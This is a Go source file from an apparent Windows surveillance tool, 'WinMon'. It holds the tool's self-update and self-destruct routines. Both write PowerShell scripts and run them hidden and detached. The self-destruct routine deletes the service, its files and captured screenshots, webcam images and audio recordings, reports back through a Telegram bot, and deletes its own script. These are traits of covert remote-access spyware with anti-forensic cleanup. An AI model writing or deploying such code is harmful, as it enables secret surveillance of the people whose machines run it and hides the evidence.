package updater

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	"winmon/internal/service"
)

// ValidateBinary checks if the file is a valid Windows executable (PE format starting with "MZ").
func ValidateBinary(path string) error {
	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()

	header := make([]byte, 2)
	_, err = file.Read(header)
	if err != nil {
		return err
	}

	if string(header) != "MZ" {
		return fmt.Errorf("invalid Windows executable format (missing MZ header)")
	}
	return nil
}

// UpdateService launches a detached PowerShell updater script and exits.
func UpdateService(tempExePath, botToken string, chatID int64) error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	scriptPath := filepath.Join(service.GetSharedTempDir(), "winmon_update.ps1")

	slashedTemp := filepath.ToSlash(tempExePath)
	slashedExe := filepath.ToSlash(exePath)

	var startCmd string
	var successMsg string
	if service.IsRunningAsService() {
		startCmd = "Start-Service -Name WinMon -ErrorAction SilentlyContinue"
		successMsg = "🟢 WinMon service has been updated successfully!"
	} else {
		startCmd = fmt.Sprintf(`Start-Process -FilePath "%s" -ArgumentList "-console"`, slashedExe)
		successMsg = "🟢 WinMon (Console Mode) has been updated successfully!"
	}

	psScript := fmt.Sprintf(`
$ErrorActionPreference = "Stop"
Set-Location -Path "C:\"
Start-Sleep -Seconds 2
Stop-Service -Name WinMon -Force -ErrorAction SilentlyContinue
Stop-Process -Name winmon -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
try {
    Copy-Item -Path "%s" -Destination "%s" -Force
    Remove-Item -Path "%s" -Force
    %s
    $body = @{ chat_id = "%d"; text = "%s" }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot%s/sendMessage" -Method Post -Body $body
} catch {
    $errText = "🔴 Update failed on this PC during copy: " + $_.Exception.Message
    $body = @{ chat_id = "%d"; text = $errText }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot%s/sendMessage" -Method Post -Body $body
}
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
`, slashedTemp, slashedExe, slashedTemp, startCmd, chatID, successMsg, botToken, chatID, botToken)

	err = os.WriteFile(scriptPath, []byte(psScript), 0644)
	if err != nil {
		return err
	}

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-File", scriptPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x00000008, // DETACHED_PROCESS
	}

	return cmd.Start()
}

// ImplodeService stops and uninstalls the service, then deletes the executable and files.
func ImplodeService(botToken string, chatID int64) error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	exeDir := filepath.Dir(exePath)
	configPath := filepath.Join(exeDir, "config.json")
	statePath := filepath.Join(exeDir, "state.json")
	scriptPath := filepath.Join(service.GetSharedTempDir(), "winmon_implode.ps1")

	slashedExe := filepath.ToSlash(exePath)
	slashedConfig := filepath.ToSlash(configPath)
	slashedState := filepath.ToSlash(statePath)
	slashedExeDir := filepath.ToSlash(exeDir)

	psScript := fmt.Sprintf(`
Set-Location -Path "C:\"
Start-Sleep -Seconds 2
Stop-Service -Name WinMon -Force -ErrorAction SilentlyContinue
$limit = 10
while ((Get-Process -Name winmon -ErrorAction SilentlyContinue) -and ($limit -gt 0)) {
    Start-Sleep -Seconds 1
    $limit--
}
Stop-Process -Name winmon -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
& sc.exe delete WinMon
Start-Sleep -Seconds 3

# 1. Clean up target executable, config, and state
Remove-Item -Path "%s" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "%s" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "%s" -Force -ErrorAction SilentlyContinue

# 2. Clean up installation folder
Remove-Item -Path "%s" -Recurse -Force -ErrorAction SilentlyContinue

# 3. Clean up all temporary files (screenshots, webcams, audio recordings, logs)
Remove-Item -Path "C:\Windows\Temp\winmon_*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Temp\helper_*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Temp\screenshot.jpg" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Temp\webcam.jpg" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Temp\record.gif" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Temp\audio.wav" -Force -ErrorAction SilentlyContinue

$body = @{ chat_id = "%d"; text = "💥 WinMon service and all associated local files have been completely removed from this PC." }
Invoke-RestMethod -Uri "https://api.telegram.org/bot%s/sendMessage" -Method Post -Body $body
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
`, slashedExe, slashedConfig, slashedState, slashedExeDir, chatID, botToken)

	err = os.WriteFile(scriptPath, []byte(psScript), 0644)
	if err != nil {
		return err
	}

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-File", scriptPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x00000008, // DETACHED_PROCESS
	}

	return cmd.Start()
}
